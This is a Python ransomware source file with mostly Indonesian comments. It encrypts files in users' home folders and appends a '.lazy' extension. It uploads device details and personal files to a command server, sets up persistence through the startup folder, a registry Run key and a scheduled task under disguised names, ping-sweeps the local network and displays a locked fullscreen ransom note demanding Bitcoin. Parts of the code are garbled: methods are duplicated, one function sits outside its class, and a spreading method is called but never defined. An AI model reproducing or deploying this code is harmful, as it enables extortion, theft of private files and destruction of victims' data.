# Imports
from cryptography.fernet import Fernet  # type: ignore # encrypt/decrypt files on target system
import os  # to get system root

# import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes  # so we can interact with windows dlls and change windows background etc
import urllib.request  # used for downloading and saving background image
import requests  # type: ignore # used to make get reqeust to api.ipify.org to get target machine ip addr
import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime  # to give time limit on ransom note
import subprocess  # to create process for notepad and open ransom note
# used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA # type: ignore
from Crypto.Random import get_random_bytes # type: ignore
from Crypto.Cipher import AES, PKCS1_OAEP # type: ignore
import base64
import threading  # used for ransom note and decryption key on dekstop
from pathlib import Path
import tkinter as tk
import sys
import platform
import socket
import glob
import shutil

# Konfigurasi API
API_TOKEN = "lazarus"
SERVER_URL = "http://192.168.1.21:5000"


class RansomWare:
    def send_device_info(self, server_url, token):
        try:
            info = {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "public_ip": self.publicIP,
            }
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            r = requests.post(f"{server_url}/upload_info", json=info, headers=headers)
            print(f"[INFO] Device info sent: {r.status_code}")
        except Exception as e:
            print(f"[ERROR] Failed to send device info: {e}")

    def send_file_to_server(self, server_url, token, file_path):
        try:
            hostname = socket.gethostname()
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                data = {"hostname": hostname, "token": token}
                r = requests.post(f"{server_url}/upload_file", files=files, data=data)
                print(f"[INFO] File sent: {r.status_code} - {file_path}")
        except Exception as e:
            print(f"[ERROR] Failed to send file: {e}")

    def collect_and_send_files(self, server_url, token):
        target_dirs = [
            os.path.join(Path.home(), "Documents"),
            os.path.join(Path.home(), "Desktop"),
            os.path.join(Path.home(), "Downloads"),
            os.path.join(Path.home(), "Pictures"),
        ]
        for folder in target_dirs:
            for root, _, files in os.walk(folder):
                for file in files:
                    full_path = os.path.join(root, file)
                    if os.path.isfile(full_path):
                        self.send_file_to_server(server_url, token, full_path)

    def deploy_to_startup(self, script_path):
        import shutil
        import getpass
        import sys

        try:
            if os.name != "nt":
                print("[!] Startup autorun hanya berlaku untuk Windows.")
                return

            startup_dir = os.path.join(
                os.environ["APPDATA"],
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )

            target_path = os.path.join(startup_dir, os.path.basename(script_path))
            shutil.copy(script_path, target_path)
            print(f"[+] Script berhasil disalin ke Startup: {target_path}")

        except Exception as e:
            print(f"[!] Gagal menyebar ke Startup folder: {e}")

    
    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None
        self.file_exts = [
            "exe,",
            "dll",
            "so",
            #'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            "jpg",
            "jpeg",
            "bmp",
            "gif",
            "png",
            "svg",
            "psd",
            "raw",  # images
            "mp3",
            "mp4",
            "m4a",
            "aac",
            "ogg",
            "flac",
            "wav",
            "wma",
            "aiff",
            "ape",  # music and sound
            "avi",
            "flv",
            "m4v",
            "mkv",
            "mov",
            "mpg",
            "mpeg",
            "wmv",
            "swf",
            "3gp",  # Video and movies
            "doc",
            "docx",
            "xls",
            "xlsx",
            "ppt",
            "pptx",  # Microsoft office
            "odt",
            "odp",
            "ods",
            "txt",
            "rtf",
            "tex",
            "pdf",
            "epub",
            "md",  # OpenOffice, Adobe, Latex, Markdown, etc
            "yml",
            "yaml",
            "json",
            "xml",
            "csv",  # structured data
            "db",
            "sql",
            "dbf",
            "mdb",
            "iso",  # databases and disc images
            "html",
            "htm",
            "xhtml",
            "php",
            "asp",
            "aspx",
            "js",
            "jsp",
            "css",  # web technologies
            "c",
            "cpp",
            "cxx",
            "h",
            "hpp",
            "hxx",  # C source code
            "java",
            "class",
            "jar",  # java source code
            "ps",
            "bat",
            "vb",  # windows based scripts
            "awk",
            "sh",
            "cgi",
            "pl",
            "ada",
            "swift",  # linux/mac based scripts
            "go",
            "py",
            "pyc",
            "bf",
            "coffee",  # other source code files
            "zip",
            "tar",
            "tgz",
            "bz2",
            "7z",
            "rar",
            "bak",
        ],
        self.persistence_methods = [
        self._add_startup_persistence,
        self._add_registry_persistence,
        self._add_scheduled_task
        ],
        self.encrypted_extension = ".lazy"
        

        """ Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        """
        # Use proper path joining for Windows
        if os.name == "nt":  # Windows
            self.sysRoot = os.path.join("C:\\", "Users", os.getenv("USERNAME"))
        else:  # Linux/Mac
            # Use sysroot to create absolute path for files, etc. And for encrypting whole system
            self.sysRoot = os.path.expanduser("~")
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get("https://api.ipify.org").text

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def _add_startup_persistence(self):
        import shutil
        import sys
        import os
        import winreg

        try:
            print("[DEBUG] Menambahkan persistence ke startup...")

            startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            exe_path = sys.executable  # Path ke file .exe saat sudah dibuild

            # 1. Copy ke Startup Folder
            target_path = os.path.join(startup_dir, "wincheck.exe")
            if not os.path.exists(target_path):
                shutil.copy2(exe_path, target_path)
                print("[✓] Disalin ke folder Startup:", target_path)

            # 2. Tambah ke Registry HKCU\Run
            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WinCheck", 0, winreg.REG_SZ, target_path)
                print("[✓] Ditambahkan ke registry autorun.")

        except Exception as e:
            print("[✗] Gagal tambah persistence:", e)


    def _add_registry_persistence(self):
        import os
        import sys
        import winreg

        try:
            exe_path = sys.executable
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
                print("[✓] Persistence via registry berhasil.")
        except Exception as e:
            print("[✗] Gagal tambah registry persistence:", e)


    def _add_scheduled_task(self):
        import subprocess
        import sys

        try:
            exe_path = sys.executable
            task_name = "WindowsSecurityTask"
            cmd = f'schtasks /Create /SC ONLOGON /TN {task_name} /TR "{exe_path}" /RL HIGHEST /F'
            result = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                print("[✓] Persistence via scheduled task berhasil.")
            else:
                print("[✗] Gagal menambahkan scheduled task.")
        except Exception as e:
            print("[✗] Error saat menambahkan scheduled task:", e)

    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key = Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)

    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open("fernet_key.txt", "wb") as f:
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        """Enkripsi kunci Fernet dengan RSA public key"""
        try:
            # Baca kunci Fernet
            with open("fernet_key.txt", "rb") as f:
                fernet_key = f.read()

            # Baca public key
            if not os.path.exists("public.pem"):
                raise FileNotFoundError("File public.pem tidak ditemukan")

            self.public_key = RSA.import_key(open("public.pem").read())
            public_crypter = PKCS1_OAEP.new(self.public_key)

            # Enkripsi dan simpan
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            with open("fernet_key.txt", "wb") as f:
                f.write(enc_fernet_key)

            # Buat file untuk dikirim ke attacker
            with open(f"{self.sysRoot}/Desktop/EMAIL_ME.txt", "wb") as f:
                f.write(enc_fernet_key)

            print("> Kunci Fernet berhasil dienkripsi dengan RSA public key")
            return True

        except Exception as e:
            print(f"> Gagal mengenkripsi kunci Fernet: {str(e)}")
            return False

    def get_target_dirs(self):
        if os.name == "nt":
            folders = ["Documents", "Pictures", "Music", "Videos", "Desktop"]
        elif os.name == "posix":
            folders = ["Documents", "Pictures", "Music", "Videos", "Desktop"]
        else:
            print("[!] Unsupported OS")
            return []
        return [os.path.join(Path.home(), folder) for folder in folders]

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def encrypt_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = self.crypter.encrypt(data)
            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)
            os.remove(file_path)
            print(f"[+] Encrypted: {file_path} -> {encrypted_path}")
        except Exception as e:
            print(f"[!] Failed to encrypt {file_path}: {e}")

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        folders_path = self.get_target_dirs()
        for folder in folders_path:
            for root, _, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    if encrypted:
                        if file_path.endswith(self.encrypted_extension):
                            self.decrypt_file(file_path)
                    else:
                        if not file_path.endswith(self.encrypted_extension) and any(
                            file.lower().endswith(f".{ext}") for ext in self.file_exts
                        ):
                            self.encrypt_file(file_path)

        # Deteksi host lain di jaringan lokal (simulasi edukatif)
        import ipaddress
        import subprocess

        try:
            subnet = "192.168.1.0/24"
            ip_net = ipaddress.ip_network(subnet, strict=False)
            active_ips = []
            for ip in ip_net.hosts():
                result = subprocess.run(
                    ["ping", "-n" if os.name == "nt" else "-c", "1", str(ip)],
                    stdout=subprocess.DEVNULL,
                )
                if result.returncode == 0:
                    active_ips.append(str(ip))
            if active_ips:
                print(f"> Ditemukan host aktif di jaringan lokal: {active_ips}")
            else:
                print("> Tidak ditemukan host aktif lain di jaringan.")
        except Exception as e:
            print(f"> Gagal scan jaringan: {e}")

            for root, _, files in os.walk(folders_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.isdir(file_path):
                        continue
                    if encrypted:
                        if not file_path.endswith(self.encrypted_extension):
                            continue
                    else:
                        if not any(
                            file.lower().endswith(f".{ext}") for ext in self.file_exts
                        ):
                            continue
                    try:
                        self.crypt_file(file_path, encrypted)
                    except Exception as e:
                        print(f"> Error processing {file_path}: {str(e)}")

    
def change_desktop_background(self, image_source=None):
    import os
    import requests
    import ctypes
    import platform

    try:
        default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
        image_url = image_source or default_url

        bg_path = os.path.abspath(os.path.join(self.sysRoot, "Desktop", "background.jpg"))

        # Unduh gambar jika dari URL
        if image_url.startswith("http"):
            try:
                print("> Mengunduh gambar dari URL...")
                r = requests.get(image_url, verify=False, timeout=10)
                with open(bg_path, "wb") as f:
                    f.write(r.content)
                print("> Gambar berhasil diunduh.")
            except Exception as e:
                print(f"> ERROR download: {e}")
                return
        else:
            if not os.path.exists(image_url):
                print(f"> ERROR: File tidak ditemukan: {image_url}")
                return
            with open(image_url, "rb") as src, open(bg_path, "wb") as dst:
                dst.write(src.read())
            print("> Gambar lokal disalin.")

        # Ubah wallpaper
        if os.name == "nt":
            SPI_SETDESKWALLPAPER = 20
            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bg_path, 3)
            if result:
                print("> Wallpaper berhasil diubah di Windows.")
            else:
                print("> Gagal mengubah wallpaper di Windows.")
        elif os.name == "posix":
            # Linux GNOME
            cmd = f"gsettings set org.gnome.desktop.background picture-uri 'file://{bg_path}'"
            os.system(cmd)
            print("> Wallpaper berhasil diubah di GNOME.")
        else:
            print("> Sistem tidak dikenali, tidak bisa ubah wallpaper.")

    except Exception as e:
        print(f"> ERROR saat ubah wallpaper: {e}")



        try:
            default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
            image_url = image_source or default_url
            bg_path = os.path.join(self.sysRoot, "Desktop", "background.jpg")

            if image_url.startswith("http"):
                urllib.request.urlretrieve(image_url, bg_path)
            else:
                if not os.path.exists(image_url):
                    print(f"> ERROR: File tidak ditemukan: {image_url}")
                    return
                with open(image_url, "rb") as src, open(bg_path, "wb") as dst:
                    dst.write(src.read())

            if os.name == "nt":
                # Windows
                import ctypes

                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(
                    SPI_SETDESKWALLPAPER, 0, bg_path, 3
                )
                print("> Wallpaper berhasil diubah di Windows.")
            elif os.name == "posix":
                # Linux GNOME (GSettings)
                cmd = f"gsettings set org.gnome.desktop.background picture-uri 'file://{bg_path}'"
                os.system(cmd)
                print("> Wallpaper berhasil diubah di GNOME.")
            else:
                print("> Sistem operasi tidak didukung untuk ubah wallpaper.")
        except Exception as e:
            print(f"> ERROR saat ubah wallpaper: {str(e)}")

    def ransom_note(self):
        date = datetime.date.today().strftime("%d-%B-Y")
        with open("RANSOM_NOTE.txt", "w") as f:
            f.write(
                f"""
The hard disks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
"""
            )
    
    def _add_startup_persistence(self):
        """Metode startup folder"""
        startup_path = os.path.join(
            os.environ['APPDATA'],
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
            'system_check.exe'
        )
        try:
            if not os.path.exists(startup_path):
                shutil.copy2(sys.executable, startup_path)
                print(f"[+] Persistence added to Startup folder: {startup_path}")
        except Exception as e:
            print(f"[-] Startup persistence failed: {e}")

    def _add_registry_persistence(self):
        """Metode registry"""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            print("[+] Registry persistence added")
        except Exception as e:
            print(f"[-] Registry persistence failed: {e}")

    def _add_scheduled_task(self):
        """Metode scheduled task"""
        try:
            task_cmd = (
                f'schtasks /create /tn "SystemHealthCheck" /tr "{sys.executable}" '
                '/sc onlogon /rl highest /f'
            )
            subprocess.run(task_cmd, shell=True, check=True)
            print("[+] Scheduled task created")
        except subprocess.CalledProcessError as e:
            print(f"[-] Task scheduler failed: {e}")
    def _hide_process(self):
        """Menyembunyikan proses (Windows only)"""
        if os.name == 'nt':
            try:
                ctypes.windll.kernel32.SetConsoleTitleW("svchost")
                print("[+] Process hidden as svchost")
            except:
                print("[-] Failed to hide process")

    def show_ransom_note(self):
        import tkinter as tk
        from tkinter import messagebox
        from pathlib import Path
        from Crypto.PublicKey import RSA # type: ignore
        from Crypto.Cipher import PKCS1_OAEP # type: ignore

        ransom_text = (
            "Ooops, your important files are encrypted.\n\n"
            "If you see this text, then your files are no longer accessible, because they\n"
            "have been encrypted. Perhaps you are busy looking for a way to recover your\n"
            "files, but don't waste your time. Nobody can recover your files without our\n"
            "decryption service.\n\n"
            "We guarantee that you can recover all your files safely and easily. All you\n"
            "need to do is submit the payment and purchase the decryption key.\n\n"
            "Please follow the instructions:\n\n"
            "1. Send $300 worth of Bitcoin to following address:\n"
            "   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\n\n"
            "2. Send your Bitcoin wallet ID and personal installation key to e-mail\n"
            "   wormshit123456@posteo.net. Your personal installation key:\n\n"
            f"   {self.key.decode()}\n\n"
            "If you already purchased your key, please enter it below and click Decrypt.\n"
        )

        def try_auto_decrypt_from_RSA():
            try:
                desktop = Path.home() / "Desktop"
                encrypted_key_path = desktop / "EMAIL_ME.txt"
                private_key_path = desktop / "private.pem"

                if encrypted_key_path.exists() and private_key_path.exists():
                    with open(private_key_path, "rb") as f:
                        private_key = RSA.import_key(f.read())

                    cipher_rsa = PKCS1_OAEP.new(private_key)
                    with open(encrypted_key_path, "rb") as f:
                        encrypted_fernet_key = f.read()

                    decrypted_key = cipher_rsa.decrypt(encrypted_fernet_key)
                    if decrypted_key == self.key:
                        print("> Kunci RSA cocok, dekripsi dimulai...")
                        self.crypt_system(encrypted=True)
                        return True
                    else:
                        print("> Kunci RSA tidak cocok.")
                else:
                    print("> File EMAIL_ME.txt atau private.pem tidak ditemukan.")
            except Exception as e:
                print(f"> ERROR saat dekripsi RSA: {e}")
            return False

        if try_auto_decrypt_from_RSA():
            return

        # GUI jika gagal otomatis
        root = tk.Tk()
        root.configure(bg="black")
        root.attributes("-fullscreen", True)
        root.title("Ooops, your files are encrypted")

        def disable_event():
            pass

        root.protocol("WM_DELETE_WINDOW", disable_event)
        root.bind("<Escape>", lambda e: None)

        text_box = tk.Text(
            root, bg="black", fg="red", font=("Courier New", 14), borderwidth=0
        )
        text_box.insert("1.0", ransom_text)
        text_box.config(state=tk.DISABLED)
        text_box.pack(expand=True, fill="both")

        entry = tk.Entry(
            root, font=("Courier New", 14), bg="black", fg="red", insertbackground="red"
        )
        entry.pack(fill="x", padx=40, pady=(0, 10))

        def attempt_decrypt():
            key = entry.get().strip().encode()
            if key == self.key:
                messagebox.showinfo("Decrypt", "Key accepted. Decrypting files...")
                root.destroy()
                self.crypt_system(encrypted=True)
            else:
                messagebox.showerror("Error", "Invalid key. Try again.")

        decrypt_btn = tk.Button(
            root,
            text="Decrypt",
            command=attempt_decrypt,
            font=("Courier New", 12),
            bg="red",
            fg="black",
        )
        decrypt_btn.pack(pady=(0, 20))

        root.mainloop()

    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print("started")  # Debugging/Testing
        while True:
            try:
                print("trying")  # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
                with open(f"{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt", "r") as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print("decrypted")  # Debugging/Testing
                    break
            except Exception as e:
                print(e)  # Debugging/Testing
                pass
            time.sleep(
                10
            )  # Debugging/Testing check for file on desktop ever 10 seconds
            print("Checking for PUT_ME_ON_DESKTOP.txt")  # Debugging/Testing
            # Would use below code in real life etc... above 10secs is just to "show" concept
            # Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))


def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    if getattr(sys, 'restarting', False):
        rw.show_ransom_note()
    else:
        # Eksekusi normal
        sys.restarting = True
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    for method in rw.persistence_methods:
            method()
    rw.ransom_note()

    rw.send_device_info(SERVER_URL, API_TOKEN)
    rw.collect_and_send_files(SERVER_URL, API_TOKEN)
    rw.deploy_to_startup(script_path=sys.argv[0])
    rw.spread_to_network_hosts(local_file=sys.argv[0])
    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print(
        "> RansomWare: Attack completed on target machine and system is encrypted"
    )  # Debugging/Testing
    print(
        "> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine"
    )  # Debugging/Testing
    t2.start()
    print("> RansomWare: Target machine has been un-encrypted")  # Debugging/Testing
    print("> RansomWare: Completed")  # Debugging/Testing


if __name__ == "__main__":
    main()
